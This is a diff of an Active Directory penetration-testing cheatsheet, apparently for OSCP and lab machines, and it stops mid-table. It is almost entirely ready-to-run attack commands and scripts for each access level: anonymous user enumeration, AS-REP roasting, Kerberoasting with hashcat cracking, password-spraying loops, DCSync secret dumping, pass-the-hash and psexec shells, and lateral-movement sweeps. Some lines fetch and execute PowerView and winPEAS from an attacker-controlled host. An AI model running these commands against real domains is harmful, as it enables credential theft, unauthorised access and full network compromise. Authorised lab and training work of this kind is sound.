@@ -1,326 +1,326 @@
 ╔══════════════════════════════════════════════════════════════════════════════════╗
-║               COMPLETE AD PENETRATION TESTING CHEATSHEET - PRACTICAL            ║
+║               COMPLETE AD ENUMERATION - 3 SCENARIOS READY TO USE               ║
 ╚══════════════════════════════════════════════════════════════════════════════════╝
 
 ╔══════════════════════════════════════════════════════════════════════════════════╗
-║                          QUICK START - AD ENUMERATION                           ║
+║                    SCENARIO 1: BLACK BOX - NO CREDENTIALS                      ║
 ╚══════════════════════════════════════════════════════════════════════════════════╝
 
-│ STEP 1: ENUMERATE USERS (NO CREDS) - DO THIS FIRST!                              │
+│ STEP 1: INITIAL SCAN (2-5 MINUTES)                                               │
+│ nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389 -oA initial_scan 10.10.10.10 │
 │                                                                                   │
-│ # Method 1: LDAP Anonymous (Fastest if works)                                     │
-│ ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d" " -f2 > users.txt │
-│ # Example: ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d" " -f2 │
+│ STEP 2: CHECK ANONYMOUS ACCESS (TRY ALL METHODS)                                 │
 │                                                                                   │
-│ # Method 2: SMB Null Session (Works on many boxes)                                │
-│ rpcclient -U "" -N 10.10.10.10 -c "enumdomusers" | grep -o "\[.*\]" | tr -d '[]' | grep -v "0x" > users.txt │
-│ # Example: rpcclient -U "" -N blackfield.htb -c "enumdomusers"                    │
+│ # 1. LDAP Anonymous (Port 389)                                                    │
+│ ldapsearch -x -H ldap://10.10.10.10 -b "" -s base namingContexts                 │
+│ # If returns DC info → anonymous bind works                                       │
 │                                                                                   │
-│ # Method 3: CrackMapExec (Quick check)                                            │
-│ crackmapexec smb 10.10.10.10 --users | grep -v "\[-\]" | cut -d"\\" -f2 | cut -d" " -f1 > users.txt │
-│ # Example: crackmapexec smb 10.10.10.10 --users                                   │
+│ # 2. SMB Null Session (Port 445)                                                  │
+│ smbclient -L //10.10.10.10 -N                                                    │
+│ rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"                                 │
+│ # If shows shares/users → null session works                                      │
 │                                                                                   │
-│ # Method 4: Kerbrute (If Kerberos open)                                           │
-│ ./kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/seclists/Usernames/top-usernames-shortlist.txt │
-│ # Example: kerbrute userenum -d htb.local --dc 10.10.10.161 users.txt             │
+│ # 3. Kerberos Pre-auth Check (Port 88)                                            │
+│ # Need usernames first, skip for now                                             │
 │                                                                                   │
-│ STEP 2: ATTACK WITH USERNAMES                                                     │
+│ STEP 3: ENUMERATE USERS WITHOUT CREDS                                             │
 │                                                                                   │
-│ # 1. AS-REP Roasting (Check for users without pre-auth)                          │
-│ GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -request │
-│ # Example: GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161 -request │
-│ # If hash appears: hashcat -m 18200 hash.txt rockyou.txt                         │
+│ # Method A: LDAP Anonymous Enum (BEST if works)                                   │
+│ ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d" " -f2 > users.txt │
+│ # Also get descriptions for password hints:                                       │
+│ ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" description sAMAccountName | grep -B1 -i "password\|pass\|pwd" │
+│                                                                                   │
+│ # Method B: SMB/RPC Enum (Second best)                                            │
+│ rpcclient -U "" -N 10.10.10.10                                                    │
+│ rpcclient> enumdomusers                                                           │
+│ rpcclient> querydispinfo                                                          │
+│ rpcclient> enumdomgroups                                                          │
+│ # Or one-liner:                                                                   │
+│ rpcclient -U "" -N 10.10.10.10 -c "enumdomusers;enumdomgroups;querydispinfo" 2>/dev/null | grep -o "\[.*\]" | tr -d '[]' | grep -v "0x" > users.txt │
+│                                                                                   │
+│ # Method C: NetExec Quick Enum                                                    │
+│ netexec smb 10.10.10.10 --users                                                   │
+│ netexec smb 10.10.10.10 --groups                                                  │
+│ netexec smb 10.10.10.10 --local-groups                                            │
+│                                                                                   │
+│ # Method D: Kerbrute (If Kerberos open)                                           │
+│ kerbrute userenum -d corp.local --dc 10.10.10.10 /usr/share/seclists/Usernames/top-usernames-shortlist.txt │
+│                                                                                   │
+│ STEP 4: ATTACK WITH USERNAMES ONLY                                                │
+│                                                                                   │
+│ # 1. AS-REP Roasting                                                              │
+│ GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -request -outputfile asrep_hashes.txt │
+│ # If you get hashes: hashcat -m 18200 asrep_hashes.txt rockyou.txt               │
 │                                                                                   │
 │ # 2. Password Spraying (Try common passwords)                                     │
-│ crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success  │
-│ crackmapexec smb 10.10.10.10 -u users.txt -p 'Welcome1' --continue-on-success     │
-│ crackmapexec smb 10.10.10.10 -u users.txt -p 'Spring2024!' --continue-on-success  │
-│ # Example: crackmapexec smb 10.10.10.10 -u admin -p 'Password123'                 │
+│ for pass in 'Password123' 'Welcome1' 'Spring2024!' 'Company2024!' 'P@ssw0rd'; do │
+│   echo "Trying: $pass"                                                           │
+│   netexec smb 10.10.10.10 -u users.txt -p "$pass" --continue-on-success          │
+│   netexec winrm 10.10.10.10 -u users.txt -p "$pass" --continue-on-success        │
+│ done                                                                              │
 │                                                                                   │
-│ # 3. Check LDAP for password hints                                                │
-│ ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=user)" description | grep -i password │
-│ # Example: ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" description │
+│ # 3. Check SMB Shares for Sensitive Data                                          │
+│ smbclient -L //10.10.10.10 -N                                                    │
+│ # If you find readable shares:                                                    │
+│ smbclient //10.10.10.10/Data -N -c "ls;get secret.txt"                           │
 │                                                                                   │
-╠══════════════════════════════════════════════════════════════════════════════════╣
-║                    WORKING IMPACKET COMMANDS - CORRECT FORMAT                  ║
-╚══════════════════════════════════════════════════════════════════════════════════╝
-
-│ 1. AS-REP ROASTING (GetNPUsers.py):                                               │
-│   # REQUIRES: List of usernames OR specific username                             │
-│   GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -request │
-│   GetNPUsers.py domain.local/svc_backup -no-pass -dc-ip 10.10.10.10 -request      │
+│ # 4. RID Brute Force (Last resort)                                                │
+│ lookupsid.py corp.local/guest:''@10.10.10.10                                      │
 │                                                                                   │
-│   # WORKING EXAMPLES:                                                             │
-│   GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161 -request │
-│   GetNPUsers.py BLACKFIELD.local/support -no-pass -dc-ip blackfield.htb           │
-│   GetNPUsers.py corp.local/ -usersfile found_users.txt -no-pass -dc-ip dc01.corp.local -outputfile asrep_hashes.txt │
-│                                                                                   │
-│ 2. KERBEROASTING (GetUserSPNs.py):                                                │
-│   # REQUIRES: Valid credentials (password or hash)                               │
-│   GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password           │
-│   GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user -hashes :NTLM_HASH │
-│   export KRB5CCNAME=ticket.ccache; GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/ -k -no-pass │
-│                                                                                   │
-│   # WORKING EXAMPLES:                                                             │
-│   GetUserSPNs.py -request -dc-ip 10.10.10.161 htb.local/svc-alfresco:s3rvice      │
-│   GetUserSPNs.py -request -dc-ip dc01.corp.local corp.local/administrator -hashes :fc525c9683e8fe067095ba2ddc971889 │
-│                                                                                   │
-│ 3. USER ENUMERATION (GetADUsers.py):                                              │
-│   # REQUIRES: Valid credentials                                                   │
-│   GetADUsers.py -all -dc-ip 10.10.10.10 domain.local/user:password                │
-│   GetADUsers.py -all -dc-ip 10.10.10.10 domain.local/user -hashes :NTLM_HASH      │
-│                                                                                   │
-│   # WORKING EXAMPLES:                                                             │
-│   GetADUsers.py -all -dc-ip 10.10.10.161 htb.local/svc-alfresco:s3rvice           │
-│   GetADUsers.py -all -dc-ip dc01.corp.local corp.local/backup:Backup123!          │
-│                                                                                   │
-│ 4. SECRETS DUMP (DCSync):                                                         │
-│   secretsdump.py domain.local/user:password@10.10.10.10                           │
-│   secretsdump.py -just-dc-user krbtgt domain.local/user:password@10.10.10.10      │
-│                                                                                   │
-│   # WORKING EXAMPLES:                                                             │
-│   secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161                      │
-│   secretsdump.py -just-dc-user administrator corp.local/backup:Backup123!@dc01.corp.local │
-│                                                                                   │
-│ 5. PSEXEC (Get Shell):                                                            │
-│   psexec.py domain.local/user:password@10.10.10.10                                │
-│   psexec.py domain.local/user@10.10.10.10 -hashes :NTLM_HASH                      │
-│   export KRB5CCNAME=ticket.ccache; psexec.py domain.local/user@10.10.10.10 -k -no-pass │
-│                                                                                   │
-│   # WORKING EXAMPLES:                                                             │
-│   psexec.py htb.local/administrator:Password123@10.10.10.161                      │
-│   psexec.py corp.local/administrator@dc01.corp.local -hashes :fc525c9683e8fe067095ba2ddc971889 │
+│ STEP 5: IF YOU GET A PASSWORD/CREDENTIAL → GO TO SCENARIO 3                      │
 │                                                                                   │
 ╠══════════════════════════════════════════════════════════════════════════════════╣
-║                    AUTOMATED ENUMERATION SCRIPT - READY TO USE                 ║
+║                SCENARIO 2: GUEST ACCOUNT ACCESS (user:'' or guest)             ║
 ╚══════════════════════════════════════════════════════════════════════════════════╝
 
+│ GUEST ACCESS TYPICALLY GIVES LIMITED INFO - CHECK THESE:                          │
+│                                                                                   │
+│ # 1. SMB with Guest Account                                                       │
+│ smbclient -L //10.10.10.10 -U guest                                               │
+│ smbclient //10.10.10.10/Public -U guest                                           │
+│                                                                                   │
+│ # 2. RPC with Guest                                                               │
+│ rpcclient -U "guest" -N 10.10.10.10                                              │
+│ rpcclient> enumdomusers                                                           │
+│ rpcclient> enumdomgroups                                                          │
+│                                                                                   │
+│ # 3. LDAP with Anonymous/Guest                                                    │
+│ ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" -D "CN=Guest,CN=Users,DC=corp,DC=local" -w "" "(objectClass=user)" │
+│                                                                                   │
+│ # 4. Lookup SID with Guest                                                        │
+│ lookupsid.py corp.local/guest:''@10.10.10.10                                      │
+│ # This often works when other methods fail                                        │
+│                                                                                   │
+│ # 5. NetExec with Guest                                                           │
+│ netexec smb 10.10.10.10 -u guest -p '' --users                                    │
+│ netexec smb 10.10.10.10 -u guest -p '' --shares                                   │
+│                                                                                   │
+│ # 6. Check for AS-REP Roastable Users (Guest can check)                          │
+│ GetNPUsers.py corp.local/guest:'' -usersfile users.txt -dc-ip 10.10.10.10 -request │
+│ # Note: Now you have SOME auth, so -no-pass not needed                           │
+│                                                                                   │
+│ # 7. Try Common Password with Guest Account                                       │
+│ # Sometimes guest has a weak password set                                         │
+│ for pass in '' 'guest' 'Guest' 'Guest123' 'password'; do                         │
+│   netexec smb 10.10.10.10 -u guest -p "$pass"                                     │
+│ done                                                                              │
+│                                                                                   │
+│ GUEST ACCOUNT USEFUL FOR:                                                         │
+│ - Enumerating users/groups                                                        │
+│ - Checking share permissions                                                      │
+│ - Finding AS-REP roastable users                                                  │
+│ - SID enumeration                                                                 │
+│ - Sometimes file read access in public shares                                     │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                SCENARIO 3: VALID USER CREDENTIALS (user:password)              ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ YOU HAVE user:password - NOW GO DEEP:                                             │
+│                                                                                   │
+│ STEP 1: BASIC ENUMERATION WITH CREDS                                              │
+│                                                                                   │
+│ # 1. LDAP Authenticated Enum                                                      │
+│ ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" -D "user@corp.local" -w 'password' "(objectClass=user)" │
+│ # Get ALL user details:                                                           │
+│ ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" -D "user@corp.local" -w 'password' "(objectClass=user)" sAMAccountName description memberOf pwdLastSet lastLogon │
+│                                                                                   │
+│ # 2. SMB Authenticated Enum                                                       │
+│ smbclient -L //10.10.10.10 -U 'corp.local\user'%'password'                       │
+│ netexec smb 10.10.10.10 -u user -p 'password' --shares                           │
+│ netexec smb 10.10.10.10 -u user -p 'password' --loggedon-users                   │
+│ netexec smb 10.10.10.10 -u user -p 'password' --sessions                         │
+│                                                                                   │
+│ # 3. Get User Info                                                                │
+│ netexec smb 10.10.10.10 -u user -p 'password' -M get_info                        │
+│ net user "user" /domain                                                           │
+│ net user "user" /domain | findstr /B /C:"User" /C:"Full" /C:"Password"           │
+│                                                                                   │
+│ STEP 2: KERBEROS ATTACKS (NOW POSSIBLE)                                           │
+│                                                                                   │
+│ # 1. Kerberoasting - Find service accounts                                        │
+│ GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/user:password              │
+│ # If you get TGS hashes: hashcat -m 13100 tgs_hashes.txt rockyou.txt             │
+│                                                                                   │
+│ # 2. Check User's Group Memberships                                               │
+│ netexec ldap 10.10.10.10 -u user -p 'password' --groups                          │
+│ # Or PowerShell: Get-ADPrincipalGroupMembership -Identity user                   │
+│                                                                                   │
+│ # 3. Get Tickets                                                                  │
+│ # Linux:                                                                          │
+│ impacket-getTGT corp.local/user:password                                          │
+│ export KRB5CCNAME=user.ccache                                                     │
+│ # Windows:                                                                        │
+│ Rubeus.exe asktgt /user:user /domain:corp.local /password:password /ptt          │
+│                                                                                   │
+│ STEP 3: BLOODHOUND COLLECTION                                                     │
+│                                                                                   │
+│ # Python collector (Linux):                                                       │
+│ bloodhound-python -d corp.local -u user -p 'password' -c All -ns 10.10.10.10 --zip │
+│                                                                                   │
+│ # SharpHound (Windows):                                                           │
+│ .\SharpHound.exe -c All --zipfilename bloodhound.zip                             │
+│ .\SharpHound.exe -c GroupMembership,LocalAdmin,Session,Trusts --zipfilename quick.zip │
+│                                                                                   │
+│ STEP 4: POWERSHELL ENUMERATION                                                    │
+│                                                                                   │
+│ # Load PowerView:                                                                 │
+│ powershell -ep bypass                                                             │
+│ IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15/PowerView.ps1')  │
+│                                                                                   │
+│ # Essential PowerView Commands:                                                   │
+│ Get-DomainUser -Identity user -Properties samaccountname,memberof,lastlogon,pwdlastset │
+│ Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member │
+│ Find-DomainShare -CheckShareAccess                                               │
+│ Get-DomainComputer -Properties operatingsystem,lastlogon | Sort-Object lastlogon -Descending │
+│ Get-DomainGPO -Properties displayname,whencreated | Sort-Object whencreated -Descending │
+│                                                                                   │
+│ STEP 5: LATERAL MOVEMENT CHECKS                                                   │
+│                                                                                   │
+│ # 1. Check where user has local admin rights:                                     │
+│ netexec smb 10.10.10.0/24 -u user -p 'password' --local-auth                     │
+│ # Or PowerView: Find-LocalAdminAccess                                             │
+│                                                                                   │
+│ # 2. Check for WinRM access:                                                      │
+│ netexec winrm 10.10.10.0/24 -u user -p 'password'                                │
+│                                                                                   │
+│ # 3. Check for RDP access:                                                        │
+│ netexec rdp 10.10.10.0/24 -u user -p 'password'                                  │
+│                                                                                   │
+│ STEP 6: PRIVILEGE ESCALATION CHECKS                                               │
+│                                                                                   │
+│ # 1. Check ACLs for abuse:                                                        │
+│ Get-DomainObjectAcl -Identity user -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|WriteDacl|WriteOwner"} │
+│                                                                                   │
+│ # 2. Check for delegation:                                                        │
+│ Get-DomainUser -Identity user -Properties samaccountname,useraccountcontrol,msds-allowedtodelegateto │
+│                                                                                   │
+│ # 3. Check user's privileges:                                                     │
+│ whoami /priv                                                                      │
+│ whoami /groups                                                                    │
+│                                                                                   │
+╠══════════════════════════════════════════════════════════════════════════════════╣
+║                    AUTOMATED SCRIPTS FOR EACH SCENARIO                         ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+│ SCENARIO 1 SCRIPT: blackbox_enum.sh                                              │
 │ #!/bin/bash                                                                       │
-│ # USAGE: ./ad_enum.sh <TARGET_IP> <DOMAIN>                                        │
-│ # EXAMPLE: ./ad_enum.sh 10.10.10.10 domain.local                                  │
+│ # Usage: ./blackbox_enum.sh <TARGET_IP> <DOMAIN>                                  │
 │                                                                                   │
 │ TARGET=$1                                                                         │
 │ DOMAIN=$2                                                                         │
-│ OUTPUT_DIR="enum_$(date +%Y%m%d_%H%M%S)"                                          │
-│ mkdir -p $OUTPUT_DIR                                                              │
 │                                                                                   │
-│ echo "[*] Starting AD enumeration on $TARGET ($DOMAIN)"                          │
-│ echo "[*] Results will be saved in: $OUTPUT_DIR"                                  │
+│ echo "[1] Testing LDAP anonymous..."                                              │
+│ ldapsearch -x -H ldap://$TARGET -b "" -s base 2>/dev/null && echo "LDAP Anonymous: YES" || echo "LDAP Anonymous: NO" │
 │                                                                                   │
-│ echo "[1] Port scan..."                                                          │
-│ nmap -p 88,389,445,636,5985,53 -sV $TARGET -oN $OUTPUT_DIR/ports.txt             │
+│ echo "[2] Testing SMB null session..."                                            │
+│ smbclient -L //$TARGET -N 2>/dev/null && echo "SMB Null: YES" || echo "SMB Null: NO" │
 │                                                                                   │
-│ echo "[2] User enumeration (LDAP)..."                                            │
-│ ldapsearch -x -H ldap://$TARGET -b "DC=${DOMAIN//./,DC=}" "(objectClass=user)" sAMAccountName 2>/dev/null | grep sAMAccountName | cut -d" " -f2 > $OUTPUT_DIR/users.txt │
+│ echo "[3] Enumerating users..."                                                   │
+│ # Try LDAP first                                                                  │
+│ ldapsearch -x -H ldap://$TARGET -b "DC=${DOMAIN//./,DC=}" "(objectClass=user)" sAMAccountName 2>/dev/null | grep sAMAccountName | cut -d" " -f2 > users.txt 2>/dev/null │
 │                                                                                   │
-│ echo "[3] User enumeration (SMB)..."                                             │
-│ rpcclient -U "" -N $TARGET -c "enumdomusers" 2>/dev/null | grep -o "\[.*\]" | tr -d '[]' | grep -v "0x" >> $OUTPUT_DIR/users.txt │
+│ # If no users, try RPC                                                            │
+│ if [ ! -s users.txt ]; then                                                       │
+│   rpcclient -U "" -N $TARGET -c "enumdomusers" 2>/dev/null | grep -o "\[.*\]" | tr -d '[]' | grep -v "0x" > users.txt │
+│ fi                                                                                │
 │                                                                                   │
-│ sort $OUTPUT_DIR/users.txt | uniq > $OUTPUT_DIR/users_unique.txt                  │
-│ USER_COUNT=$(wc -l < $OUTPUT_DIR/users_unique.txt)                               │
-│ echo "[+] Found $USER_COUNT users"                                               │
+│ echo "[4] AS-REP Roasting..."                                                     │
+│ GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $TARGET -request 2>/dev/null | grep krb5asrep │
 │                                                                                   │
-│ echo "[4] AS-REP Roasting..."                                                    │
-│ GetNPUsers.py $DOMAIN/ -usersfile $OUTPUT_DIR/users_unique.txt -no-pass -dc-ip $TARGET -request 2>/dev/null | tee $OUTPUT_DIR/asrep.txt │
+│ echo "[5] Quick password spray..."                                                │
+│ netexec smb $TARGET -u users.txt -p 'Password123' --continue-on-success 2>/dev/null | grep "\[+\]" │
 │                                                                                   │
-│ echo "[5] Password spraying..."                                                  │
-│ for PASS in 'Password123' 'Welcome1' 'Spring2024!' 'Company2024!' 'P@ssw0rd'; do  │
-│   echo "  Trying: $PASS"                                                         │
-│   crackmapexec smb $TARGET -u $OUTPUT_DIR/users_unique.txt -p "$PASS" --continue-on-success 2>/dev/null | grep "\[+\]" | tee -a $OUTPUT_DIR/spray.txt │
-│ done                                                                              │
+│ SCENARIO 2 SCRIPT: guest_enum.sh                                                  │
+│ #!/bin/bash                                                                       │
+│ TARGET=$1                                                                         │
+│ DOMAIN=$2                                                                         │
 │                                                                                   │
-│ echo "[6] SMB shares..."                                                         │
-│ smbclient -L //$TARGET -N 2>/dev/null | tee $OUTPUT_DIR/shares.txt               │
+│ echo "[1] Testing guest SMB access..."                                            │
+│ smbclient -L //$TARGET -U guest 2>/dev/null                                       │
 │                                                                                   │
-│ echo "[7] Summary:"                                                              │
-│ echo "Users: $USER_COUNT" >> $OUTPUT_DIR/summary.txt                             │
-│ echo "AS-REP: $(grep -c '\$krb5asrep' $OUTPUT_DIR/asrep.txt 2>/dev/null || echo 0)" >> $OUTPUT_DIR/summary.txt │
-│ echo "Password hits: $(grep -c "\[+\]" $OUTPUT_DIR/spray.txt 2>/dev/null || echo 0)" >> $OUTPUT_DIR/summary.txt │
+│ echo "[2] Enumerating with guest..."                                              │
+│ rpcclient -U "guest" -N $TARGET -c "enumdomusers;enumdomgroups" 2>/dev/null       │
 │                                                                                   │
-│ cat $OUTPUT_DIR/summary.txt                                                       │
-│ echo "[+] Enumeration complete! Check $OUTPUT_DIR/"                              │
+│ echo "[3] Lookup SIDs..."                                                         │
+│ lookupsid.py $DOMAIN/guest:''@$TARGET 2>/dev/null | head -20                      │
 │                                                                                   │
-╠══════════════════════════════════════════════════════════════════════════════════╣
-║                    POST-COMPROMISE - AFTER GETTING CREDS                       ║
-╚══════════════════════════════════════════════════════════════════════════════════╝
-
-│ YOU HAVE CREDENTIALS (user:password or user:hash):                                │
+│ echo "[4] Checking shares..."                                                     │
+│ netexec smb $TARGET -u guest -p '' --shares 2>/dev/null                           │
 │                                                                                   │
-│ 1. KERBEROASTING - Find service accounts:                                         │
-│   GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password           │
-│   # Example: GetUserSPNs.py -request -dc-ip dc01.corp.local corp.local/jdoe:Password123 │
-│   # Output shows service accounts with SPNs                                       │
-│   # Crack hash: hashcat -m 13100 hash.txt rockyou.txt                            │
+│ SCENARIO 3 SCRIPT: authenticated_enum.sh                                          │
+│ #!/bin/bash                                                                       │
+│ TARGET=$1                                                                         │
+│ DOMAIN=$2                                                                         │
+│ USER=$3                                                                           │
+│ PASS=$4                                                                           │
 │                                                                                   │
-│ 2. BLOODHOUND - Find attack paths:                                                │
-│   bloodhound-python -d domain.local -u user -p 'password' -c All -ns 10.10.10.10  │
-│   # Example: bloodhound-python -d corp.local -u jdoe -p 'Password123' -c All -ns dc01.corp.local │
-│   # Then: neo4j start, upload to BloodHound GUI                                   │
+│ echo "[1] Kerberoasting..."                                                       │
+│ GetUserSPNs.py -request -dc-ip $TARGET $DOMAIN/$USER:$PASS 2>/dev/null            │
 │                                                                                   │
-│ 3. POWERSHELL ENUM (Windows machine):                                             │
-│   powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15/PowerView.ps1')" │
-│   Get-DomainUser | Select samaccountname                                          │
-│   Get-DomainGroupMember -Identity "Domain Admins"                                 │
-│   Find-InterestingDomainAcl -ResolveGUIDs                                         │
+│ echo "[2] BloodHound collection..."                                               │
+│ bloodhound-python -d $DOMAIN -u $USER -p "$PASS" -c All -ns $TARGET --zip 2>/dev/null │
 │                                                                                   │
-│ 4. LATERAL MOVEMENT - Try other services:                                         │
-│   # WinRM (Port 5985):                                                            │
-│   evil-winrm -i 10.10.10.10 -u user -p password                                   │
+│ echo "[3] Getting group info..."                                                  │
+│ netexec ldap $TARGET -u $USER -p "$PASS" --groups 2>/dev/null                     │
 │                                                                                   │
-│   # RDP (Port 3389):                                                              │
-│   xfreerdp /v:10.10.10.10 /u:user /p:password /dynamic-resolution                │
-│                                                                                   │
-│   # WMI (Port 135):                                                               │
-│   impacket-wmiexec domain.local/user:password@10.10.10.10                         │
-│                                                                                   │
-│ 5. CHECK FOR PRIVILEGES:                                                          │
-│   whoami /all                                                                     │
-│   net user user /domain                                                           │
-│   net group "Domain Admins" /domain                                               │
+│ echo "[4] Checking for local admin..."                                            │
+│ netexec smb $TARGET -u $USER -p "$PASS" --local-auth 2>/dev/null                  │
 │                                                                                   │
 ╠══════════════════════════════════════════════════════════════════════════════════╣
-║                    QUICK COMMAND REFERENCE - BY SCENARIO                       ║
+║                    QUICK REFERENCE - COMMANDS BY ACCESS LEVEL                  ║
 ╚══════════════════════════════════════════════════════════════════════════════════╝
 
-│ SCENARIO 1: You have NOTHING                                                      │
-│   1. nmap -p 88,389,445,5985 10.10.10.10                                         │
-│   2. ldapsearch -x -H ldap://10.10.10.10 -b "" -s base                           │
-│   3. If LDAP works:                                                               │
-│      ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName > users.txt │
-│   4. If SMB works:                                                                │
-│      rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"                            │
-│   5. GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 │
-│   6. crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123'                  │
-│                                                                                   │
-│ SCENARIO 2: You have USERNAME(S)                                                  │
-│   1. Try AS-REP: GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 │
-│   2. Try password spray:                                                          │
-│      crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123'                  │
-│      crackmapexec smb 10.10.10.10 -u users.txt -p 'Welcome1'                     │
-│      crackmapexec winrm 10.10.10.10 -u users.txt -p 'Password123'                │
-│   3. Check for common service accounts:                                           │
-│      crackmapexec smb 10.10.10.10 -u svc_ -p 'Password123'                       │
-│      crackmapexec smb 10.10.10.10 -u sql -p 'Password123'                        │
-│                                                                                   │
-│ SCENARIO 3: You have USER:PASSWORD                                                │
-│   1. Kerberoasting: GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password │
-│   2. BloodHound: bloodhound-python -d domain.local -u user -p password -c All -ns 10.10.10.10 │
-│   3. Get shell: evil-winrm -i 10.10.10.10 -u user -p password                     │
-│   4. Dump info: GetADUsers.py -all -dc-ip 10.10.10.10 domain.local/user:password  │
-│   5. Try lateral: crackmapexec smb 10.10.10.20 -u user -p password               │
-│                                                                                   │
-│ SCENARIO 4: You have USER:HASH                                                    │
-│   1. Pass-the-Hash: crackmapexec smb 10.10.10.10 -u user -H NTLM_HASH             │
-│   2. Evil-WinRM: evil-winrm -i 10.10.10.10 -u user -H NTLM_HASH                   │
-│   3. Impacket: psexec.py domain.local/user@10.10.10.10 -hashes :NTLM_HASH         │
-│   4. Kerberoasting: GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user -hashes :NTLM_HASH │
-│                                                                                   │
-│ SCENARIO 5: You have SHELL (Windows)                                              │
-│   1. whoami /priv (look for SeImpersonate)                                        │
-│   2. net user /domain                                                             │
-│   3. net group "Domain Admins" /domain                                            │
-│   4. Download winPEAS: certutil -urlcache -split -f http://10.10.14.15/winPEASany.exe winpeas.exe │
-│   5. Run winPEAS: .\winpeas.exe                                                   │
-│   6. BloodHound: .\SharpHound.exe -c All                                          │
-│                                                                                   │
-╠══════════════════════════════════════════════════════════════════════════════════╣
-║                    OSCP EXAM - 4-HOUR AD BOX STRATEGY                          ║
-╚══════════════════════════════════════════════════════════════════════════════════╝
-
-│ FIRST 30 MINUTES:                                                                 │
-│   # 1. Add to hosts: echo "10.10.10.10 domain.local" >> /etc/hosts                │
-│   # 2. Quick scan: nmap -p 88,389,445,5985,5986,3389 10.10.10.10 -oN scan.txt    │
-│   # 3. Get users:                                                                 │
-│   ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName 2>/dev/null | head -20 │
-│   # 4. Create users.txt with first 20 users found                                 │
-│                                                                                   │
-│ MINUTES 30-90:                                                                    │
-│   # 1. AS-REP: GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 │
-│   # 2. Password spray (TRY THESE IN ORDER):                                       │
+│ NO ACCESS (Black Box):                                                            │
+│   ldapsearch -x -H ldap://10.10.10.10 -b "" -s base                               │
+│   smbclient -L //10.10.10.10 -N                                                   │
+│   rpcclient -U "" -N 10.10.10.10 -c "enumdomusers"                                │
+│   GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10    │
 │   crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123'                      │
-│   crackmapexec smb 10.10.10.10 -u users.txt -p 'Welcome1'                         │
-│   crackmapexec smb 10.10.10.10 -u users.txt -p 'Spring2024!'                      │
-│   crackmapexec smb 10.10.10.10 -u users.txt -p 'Company2024!'                     │
-│   crackmapexec smb 10.10.10.10 -u users.txt -p 'P@ssw0rd'                         │
-│   # 3. Check SMB shares: smbclient -L //10.10.10.10 -N                           │
 │                                                                                   │
-│ MINUTES 90-180:                                                                   │
-│   # If you get creds:                                                             │
-│   1. evil-winrm -i 10.10.10.10 -u user -p password                               │
-│   2. Upload winPEAS: .\winpeas.exe                                               │
-│   3. BloodHound: .\SharpHound.exe -c All                                         │
-│   4. Check: whoami /priv                                                          │
-│   5. Check: net user user /domain                                                │
+│ GUEST ACCESS:                                                                     │
+│   smbclient -L //10.10.10.10 -U guest                                             │
+│   rpcclient -U "guest" -N 10.10.10.10 -c "enumdomusers"                           │
+│   lookupsid.py domain.local/guest:''@10.10.10.10                                  │
+│   GetNPUsers.py domain.local/guest:'' -usersfile users.txt -dc-ip 10.10.10.10     │
+│   netexec smb 10.10.10.10 -u guest -p '' --shares                                 │
 │                                                                                   │
-│ MINUTES 180-240:                                                                  │
-│   # Document everything:                                                          │
-│   1. Screenshot each command                                                      │
-│   2. Show user.txt capture                                                        │
-│   3. Show root.txt capture                                                        │
-│   4. Verify DA access                                                            │
-│   5. Submit proof                                                                 │
+│ USER CREDENTIALS:                                                                 │
